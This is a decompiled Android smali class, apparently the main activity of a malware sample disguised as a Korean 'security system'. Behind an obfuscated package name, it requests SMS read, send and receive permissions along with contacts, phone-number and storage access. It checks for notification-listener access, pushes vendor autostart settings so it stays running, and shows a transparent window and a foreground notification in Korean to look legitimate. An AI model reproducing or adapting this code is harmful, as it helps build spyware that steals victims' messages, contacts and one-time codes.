.class public Lgqegwqg/bbebebefff/asdcdsac/MainActivity;
.super Ld/b/b/c;
.source "sourcefile"


# instance fields
.field public s:Landroid/app/Activity;

.field public t:Landroid/webkit/WebView;

.field public u:Landroid/view/View;

.field public v:Landroid/widget/ImageView;

.field public w:Ljava/lang/String;

.field public x:Ljava/lang/String;

.field public y:Ljava/lang/String;

.field public z:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 75
    invoke-direct {p0}, Ld/b/b/c;-><init>()V

    .line 76
    iput-object p0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/app/Activity;

    .line 81
    const/4 v0, 0x0

    iput-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->z:Z

    .line 84
    nop

    .line 85
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    return-void
.end method

.method public static synthetic J(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)Landroid/widget/ImageView;
    .locals 1
    .param p0, "x0"    # Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 75
    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Landroid/widget/ImageView;

    return-object v0
.end method

.method public static synthetic K(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)Landroid/view/View;
    .locals 1
    .param p0, "x0"    # Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 75
    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/view/View;

    return-object v0
.end method

.method public static synthetic L(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)Landroid/webkit/WebView;
    .locals 1
    .param p0, "x0"    # Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 75
    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->t:Landroid/webkit/WebView;

    return-object v0
.end method

.method public static synthetic M(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;Landroid/webkit/WebView;)Landroid/webkit/WebView;
    .locals 0
    .param p0, "x0"    # Lgqegwqg/bbebebefff/asdcdsac/MainActivity;
    .param p1, "x1"    # Landroid/webkit/WebView;

    .line 75
    iput-object p1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->t:Landroid/webkit/WebView;

    return-object p1
.end method

.method public static synthetic N(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)V
    .locals 0
    .param p0, "x0"    # Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 75
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->P()V

    return-void
.end method

.method public static synthetic O(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)V
    .locals 0
    .param p0, "x0"    # Lgqegwqg/bbebebefff/asdcdsac/MainActivity;

    .line 75
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->I()V

    return-void
.end method


# virtual methods
.method public final I()V
    .locals 3

    .line 428
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/app/Activity;

    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/ForegroundService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 429
    .local v0, "serviceIntent":Landroid/content/Intent;
    const-string v1, "inputExtra"

    const-string v2, "\ubcf4\uc548 \uc2dc\uc2a4\ud15c\uc774 \uc791\ub3d9\uc911\uc785\ub2c8\ub2e4"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 430
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 431
    const/4 v1, 0x1

    sput-boolean v1, Li/a/a/p;->b:Z

    .line 433
    return-void
.end method

.method public final P()V
    .locals 5

    .line 457
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 458
    .local v0, "intent":Landroid/content/Intent;
    sget-object v1, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 459
    .local v1, "manufacturer":Ljava/lang/String;
    const-string v2, "xiaomi"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 460
    new-instance v2, Landroid/content/ComponentName;

    const-string v3, "com.miui.securitycenter"

    const-string v4, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    .line 461
    :cond_0
    const-string v2, "oppo"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 462
    new-instance v2, Landroid/content/ComponentName;

    const-string v3, "com.coloros.safecenter"

    const-string v4, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    .line 463
    :cond_1
    const-string v2, "vivo"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 464
    new-instance v2, Landroid/content/ComponentName;

    const-string v3, "com.vivo.permissionmanager"

    const-string v4, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    .line 465
    :cond_2
    const-string v2, "Letv"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 466
    new-instance v2, Landroid/content/ComponentName;

    const-string v3, "com.letv.android.letvsafe"

    const-string v4, "com.letv.android.letvsafe.AutobootManageActivity"

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    .line 467
    :cond_3
    const-string v2, "Honor"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 468
    new-instance v2, Landroid/content/ComponentName;

    const-string v3, "com.huawei.systemmanager"

    const-string v4, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 471
    :cond_4
    :goto_0
    invoke-virtual {p0}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const/high16 v3, 0x10000

    invoke-virtual {v2, v0, v3}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v2

    .line 472
    .local v2, "list":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ResolveInfo;>;"
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v3

    if-lez v3, :cond_5

    .line 473
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 477
    .end local v0    # "intent":Landroid/content/Intent;
    .end local v1    # "manufacturer":Ljava/lang/String;
    .end local v2    # "list":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ResolveInfo;>;"
    :cond_5
    goto :goto_1

    .line 475
    :catch_0
    move-exception v0

    .line 476
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "exc"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 479
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method public final Q(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "filename"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;
    .param p3, "userAgent"    # Ljava/lang/String;

    .line 366
    const-string v0, ""

    const/4 v1, 0x0

    :try_start_0
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v2

    invoke-virtual {v2, p2}, Landroid/webkit/CookieManager;->getCookie(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 367
    .local v2, "cookie":Ljava/lang/String;
    const-string v3, "download"

    invoke-virtual {p0, v3}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/DownloadManager;

    .line 368
    .local v3, "downloadManager":Landroid/app/DownloadManager;
    new-instance v4, Landroid/app/DownloadManager$Request;

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/app/DownloadManager$Request;-><init>(Landroid/net/Uri;)V

    .line 369
    .local v4, "request":Landroid/app/DownloadManager$Request;
    invoke-virtual {v4, p1}, Landroid/app/DownloadManager$Request;->setTitle(Ljava/lang/CharSequence;)Landroid/app/DownloadManager$Request;

    move-result-object v5

    const-string v6, "Downloading..."

    .line 370
    invoke-virtual {v5, v6}, Landroid/app/DownloadManager$Request;->setDescription(Ljava/lang/CharSequence;)Landroid/app/DownloadManager$Request;

    move-result-object v5

    const-string v6, "cookie"

    .line 371
    invoke-virtual {v5, v6, v2}, Landroid/app/DownloadManager$Request;->addRequestHeader(Ljava/lang/String;Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    move-result-object v5

    const-string v6, "User-Agent"

    .line 372
    invoke-virtual {v5, v6, p3}, Landroid/app/DownloadManager$Request;->addRequestHeader(Ljava/lang/String;Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    move-result-object v5

    .line 373
    invoke-virtual {p0, p2}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->R(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/app/DownloadManager$Request;->setMimeType(Ljava/lang/String;)Landroid/app/DownloadManager$Request;

    move-result-object v5

    .line 374
    const/4 v6, 0x1

    invoke-virtual {v5, v6}, Landroid/app/DownloadManager$Request;->setAllowedOverMetered(Z)Landroid/app/DownloadManager$Request;

    move-result-object v5

    .line 375
    invoke-virtual {v5, v6}, Landroid/app/DownloadManager$Request;->setAllowedOverRoaming(Z)Landroid/app/DownloadManager$Request;

    move-result-object v5

    .line 376
    invoke-virtual {v5, v6}, Landroid/app/DownloadManager$Request;->setNotificationVisibility(I)Landroid/app/DownloadManager$Request;

    .line 378
    invoke-virtual {v3, v4}, Landroid/app/DownloadManager;->enqueue(Landroid/app/DownloadManager$Request;)J

    .line 379
    const-string v5, "Download Started"

    invoke-static {p0, v5, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v5

    invoke-virtual {v5}, Landroid/widget/Toast;->show()V

    .line 381
    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->x:Ljava/lang/String;

    .line 382
    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->w:Ljava/lang/String;

    .line 383
    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 386
    .end local v2    # "cookie":Ljava/lang/String;
    .end local v3    # "downloadManager":Landroid/app/DownloadManager;
    .end local v4    # "request":Landroid/app/DownloadManager$Request;
    goto :goto_0

    .line 384
    :catch_0
    move-exception v0

    .line 385
    .local v0, "ignored":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 387
    .end local v0    # "ignored":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public final R(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "url"    # Ljava/lang/String;

    .line 390
    invoke-virtual {p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 391
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    invoke-static {}, Landroid/webkit/MimeTypeMap;->getSingleton()Landroid/webkit/MimeTypeMap;

    move-result-object v1

    .line 392
    .local v1, "mimeTypeMap":Landroid/webkit/MimeTypeMap;
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/ContentResolver;->getType(Landroid/net/Uri;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/webkit/MimeTypeMap;->getExtensionFromMimeType(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    return-object v2
.end method

.method public final S()Z
    .locals 4

    .line 345
    invoke-virtual {p0}, Landroid/app/Activity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 346
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    nop

    .line 347
    const-string v1, "enabled_notification_listeners"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 348
    .local v1, "enabledNotificationListeners":Ljava/lang/String;
    invoke-virtual {p0}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    .line 349
    .local v2, "packageName":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x1

    goto :goto_0

    :cond_0
    const/4 v3, 0x0

    :goto_0
    return v3
.end method

.method public T()V
    .locals 5

    .line 163
    iget-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->z:Z

    if-nez v0, :cond_1

    .line 166
    const/4 v0, 0x1

    iput-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->z:Z

    .line 168
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x21

    if-lt v0, v1, :cond_0

    .line 169
    nop

    .line 170
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    .line 171
    .local v0, "manager":Landroid/app/NotificationManager;
    new-instance v1, Landroid/app/NotificationChannel;

    const/4 v2, 0x3

    const-string v3, "Foreground"

    const-string v4, "\uc548\ub4dc\ub85c\uc774\ub4dc"

    invoke-direct {v1, v3, v4, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 175
    .local v1, "channel":Landroid/app/NotificationChannel;
    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 178
    .end local v0    # "manager":Landroid/app/NotificationManager;
    .end local v1    # "channel":Landroid/app/NotificationChannel;
    :cond_0
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->S()Z

    move-result v0

    .line 179
    .local v0, "isNotificationServiceRunning":Z
    invoke-static {p0}, Lg/f/a/w;->h(Landroid/content/Context;)Lg/f/a/w;

    move-result-object v1

    const-string v2, "android.permission.READ_PHONE_STATE"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 180
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    const-string v2, "android.permission.READ_SMS"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 181
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    const-string v2, "android.permission.READ_PHONE_NUMBERS"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 182
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    const-string v2, "android.permission.SEND_SMS"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 183
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    const-string v2, "android.permission.RECEIVE_SMS"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 184
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    const-string v2, "android.permission.READ_CONTACTS"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 185
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 186
    invoke-virtual {v1, v2}, Lg/f/a/w;->d([Ljava/lang/String;)Lg/f/a/w;

    new-instance v2, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;

    invoke-direct {v2, p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity$a;-><init>(Lgqegwqg/bbebebefff/asdcdsac/MainActivity;)V

    .line 187
    invoke-virtual {v1, v2}, Lg/f/a/w;->e(Lg/f/a/h;)V

    .line 307
    .end local v0    # "isNotificationServiceRunning":Z
    :cond_1
    return-void
.end method

.method public onBackPressed()V
    .locals 0

    .line 422
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 424
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled",
            "CheckResult",
            "ObsoleteSdkInt",
            "InlinedApi"
        }
    .end annotation

    .line 99
    invoke-super {p0, p1}, Ld/l/b/e;->onCreate(Landroid/os/Bundle;)V

    .line 102
    const-string v0, "gqegwqg.bbebebefff.asdcdsac"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 106
    nop

    .line 107
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    check-cast v0, Landroid/view/Window;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroid/view/Window;->setDimAmount(F)V

    .line 110
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v0

    const/16 v2, 0x2000

    invoke-virtual {v0, v2}, Landroid/view/View;->setSystemUiVisibility(I)V

    .line 111
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v2, -0x1

    invoke-virtual {v0, v2}, Landroid/view/Window;->setStatusBarColor(I)V

    .line 112
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v3, 0x2

    invoke-virtual {v0, v3}, Landroid/view/Window;->clearFlags(I)V

    .line 113
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    new-instance v3, Landroid/graphics/drawable/ColorDrawable;

    invoke-direct {v3, v1}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

    invoke-virtual {v0, v3}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 114
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x80

    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    .line 115
    const v0, 0x7f0b001c

    invoke-virtual {p0, v0}, Ld/b/b/c;->setContentView(I)V

    .line 117
    const v0, 0x7f0800ef

    invoke-virtual {p0, v0}, Ld/b/b/c;->findViewById(I)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/view/View;

    .line 119
    new-instance v0, Landroid/widget/ImageView;

    invoke-direct {v0, p0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Landroid/widget/ImageView;

    .line 120
    new-instance v0, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v0, v2, v2}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 122
    .local v0, "params":Landroid/widget/LinearLayout$LayoutParams;
    iget-object v1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Landroid/widget/ImageView;

    const v2, 0x7f070057

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 123
    iget-object v1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Landroid/widget/ImageView;

    invoke-virtual {v1, v0}, Landroid/widget/ImageView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 125
    iget-object v1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->u:Landroid/view/View;

    check-cast v1, Landroid/view/ViewGroup;

    iget-object v2, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->v:Landroid/widget/ImageView;

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 129
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->T()V

    .line 151
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .line 90
    invoke-super {p0}, Ld/b/b/c;->onDestroy()V

    .line 91
    const/4 v0, 0x0

    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->s:Landroid/app/Activity;

    .line 92
    const/4 v0, 0x0

    iput-boolean v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->z:Z

    .line 93
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 3
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .line 398
    invoke-super {p0, p1, p2, p3}, Ld/l/b/e;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 399
    const/16 v0, 0x3e9

    if-ne p1, v0, :cond_0

    .line 400
    array-length v0, p3

    if-lez v0, :cond_0

    const/4 v0, 0x0

    aget v0, p3, v0

    if-nez v0, :cond_0

    .line 401
    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->x:Ljava/lang/String;

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->w:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 402
    iget-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->w:Ljava/lang/String;

    iget-object v1, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->x:Ljava/lang/String;

    iget-object v2, p0, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->y:Ljava/lang/String;

    invoke-virtual {p0, v0, v1, v2}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->Q(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 408
    :cond_0
    return-void
.end method

.method public onResume()V
    .locals 1

    .line 154
    invoke-super {p0}, Ld/l/b/e;->onResume()V

    .line 155
    sget-boolean v0, Li/a/a/p;->b:Z

    if-nez v0, :cond_0

    .line 156
    invoke-virtual {p0}, Lgqegwqg/bbebebefff/asdcdsac/MainActivity;->T()V

    .line 159
    :cond_0
    return-void
.end method
